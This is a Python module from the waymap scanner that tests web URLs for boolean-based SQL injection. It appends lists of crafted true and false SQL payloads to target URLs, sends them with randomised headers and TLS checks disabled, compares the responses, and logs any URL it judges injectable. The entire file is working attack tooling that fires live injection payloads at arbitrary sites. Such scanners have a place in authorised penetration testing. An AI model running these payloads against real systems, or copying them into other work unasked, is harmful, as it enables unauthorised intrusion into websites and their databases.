# Copyright (c) 2024 waymap developers
# See the file 'LICENSE' for copying permission.
# boolean.py (own logic)

import requests
import random
import string
import time
import os
import json
from urllib.parse import urlparse, parse_qs
from colorama import Fore, Style, init
import warnings
from lib.parse.random_headers import generate_random_headers
from lib.injection.sqlin.sql import abort_all_tests


init(autoreset=True)

warnings.filterwarnings("ignore", message="Unverified HTTPS request")
TRUE_PAYLOADS = [
    "' AND 2*3*8=6*8 AND 'randomString'='randomString",
    "' AND 3*2>(1*5) AND 'randomString'='randomString",
    "' AND 3*2*0>=0 AND 'randomString'='randomString"
]

FALSE_PAYLOADS = [
    "' AND 2*3*8=6*9 AND 'randomString'='randomString",
    "' AND 3*3<(2*4) AND 'randomString'='randomString",
    "' AND (3*3*0)=(2*4*1*0) AND 'randomString'='randomString"
]

headers = generate_random_headers()

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def replace_placeholders(payload, rand_str):
    return payload.replace("randomString", rand_str)

def extract_parameters(url):
    """Extracts parameters from the URL."""
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)
    return list(params.keys()) if params else ["N/A"]

def load_output_file(target):
    """Loads or initializes the output JSON file."""
    parsed_url = urlparse(target)
    domain = parsed_url.netloc
    output_file = f"sessions/{domain}/waymap_full_results.json"

    if not os.path.exists(output_file):
        os.makedirs(f"sessions/{domain}", exist_ok=True)
        with open(output_file, 'w') as file:
            json.dump({"scans": []}, file, indent=4)

    with open(output_file, 'r') as file:
        return json.load(file), output_file

def save_to_output_file(target, vuln_data):
    """Saves vulnerability data to the output file while avoiding duplicates."""
    data, output_file = load_output_file(target)

    if "SQL Injection" not in data["scans"]:
        data["scans"].append({"SQL Injection": {"Technique: Boolean": []}})

    sql_injection_block = next((entry["SQL Injection"] for entry in data["scans"] if "SQL Injection" in entry), None)
    boolean_block = sql_injection_block.get("Technique: Boolean", [])

    for entry in boolean_block:
        if (entry["Vulnerable URL"] == vuln_data["Vulnerable URL"] and
            entry["Parameter"] == vuln_data["Parameter"] and
            entry["Payload"] == vuln_data["Payload"]):
            return 

    boolean_block.append(vuln_data)
    sql_injection_block["Technique: Boolean"] = boolean_block

    with open(output_file, 'w') as file:
        json.dump(data, file, indent=4)

    print(f"\n{Style.BRIGHT}[{Fore.YELLOW}Vulnerability saved to JSON{Style.RESET_ALL}] {output_file}")

def check_if_already_vulnerable(target, parameter):
    """Checks if the URL and parameter have already been recorded as vulnerable."""
    data, _ = load_output_file(target)

    if "SQL Injection" in data["scans"]:
        sql_injection_block = next((entry["SQL Injection"] for entry in data["scans"] if "SQL Injection" in entry), None)
        boolean_block = sql_injection_block.get("Technique: Boolean", [])

        for entry in boolean_block:
            if entry["Vulnerable URL"] == target and entry["Parameter"] == parameter:
                return True 

    return False

def test_payload(url, payload, retries=2):
    response_signatures = []
    for _ in range(retries):
        try:
            full_url = url + payload.replace("randomString", generate_random_string())
            response = requests.get(full_url, headers=headers, verify=False, timeout=10)
            response_signatures.append((response.status_code, len(response.text), response.text[:100]))
        except requests.RequestException:
            response_signatures.append(None)
    return response_signatures

def is_vulnerable(url):
    """Performs boolean-based SQLi tests and saves the results if vulnerable."""
    parameters = extract_parameters(url)
    for parameter in parameters:
        if check_if_already_vulnerable(url, parameter):
            print(f"{Fore.YELLOW}[!] {url} (Parameter: {parameter}) is already recorded as vulnerable. Skipping...{Style.RESET_ALL}")
            return False

        true_signatures = []
        false_signatures = []
        rand_str = generate_random_string()

        print(f"\n[{Fore.BLUE}{time.strftime('%H:%M:%S', time.localtime())}{Style.RESET_ALL}] [{Fore.GREEN}Testing{Style.RESET_ALL}] Testing URL: {url} (Parameter: {parameter})")

        for payload in TRUE_PAYLOADS:
            replaced_payload = replace_placeholders(payload, rand_str)
            print(f"[{Fore.BLUE}{time.strftime('%H:%M:%S', time.localtime())}{Style.RESET_ALL}] [{Fore.GREEN}Testing{Style.RESET_ALL}] Payload: {replaced_payload}")
            true_signatures.extend(test_payload(url, replaced_payload))

        for payload in FALSE_PAYLOADS:
            replaced_payload = replace_placeholders(payload, rand_str)
            print(f"[{Fore.BLUE}{time.strftime('%H:%M:%S', time.localtime())}{Style.RESET_ALL}] [{Fore.GREEN}Testing{Style.RESET_ALL}] Payload: {replaced_payload}")
            false_signatures.extend(test_payload(url, replaced_payload))

        true_signatures = [sig for sig in true_signatures if sig is not None]
        false_signatures = [sig for sig in false_signatures if sig is not None]

        if true_signatures and false_signatures:
            true_pattern = set(true_signatures)
            false_pattern = set(false_signatures)

            if true_pattern != false_pattern:
                print(f"\n{Style.BRIGHT}[{Fore.GREEN}VULNERABLE{Style.RESET_ALL}] URL: {url} (Parameter: {parameter})")
                print(f"{Style.BRIGHT}[{Fore.CYAN}Test Name{Style.RESET_ALL}]: Boolean-based SQL Injection")
                print(f"{Style.BRIGHT}[{Fore.CYAN}Target URL{Style.RESET_ALL}]: {url}")
                print(f"{Style.BRIGHT}[{Fore.CYAN}Parameter{Style.RESET_ALL}]: {parameter}")
                print(f"{Style.BRIGHT}[{Fore.CYAN}Payload{Style.RESET_ALL}]: {replaced_payload}")
                print(f"{Style.BRIGHT}[{Fore.CYAN}Severity{Style.RESET_ALL}]: 9.8")

                vuln_data = {
                    "Vulnerable URL": url,
                    "Parameter": parameter,
                    "Payload": replaced_payload,
                    "Severity": 9.8
                }
                save_to_output_file(url, vuln_data)
                return True

    print(f"{Fore.RED}[!] No Boolean Based SQL Injection detected at: {url}{Style.RESET_ALL}")
    return False

def process_urls(urls):
    """Processes multiple URLs for Boolean-based SQL Injection tests."""
    global abort_all_tests
    for url in urls:
        if abort_all_tests:
            break

        try:
            if is_vulnerable(url):
                break
        except KeyboardInterrupt:
            print(f"\n{Style.BRIGHT}{Fore.YELLOW}Process interrupted by user.{Style.RESET_ALL}")
            break
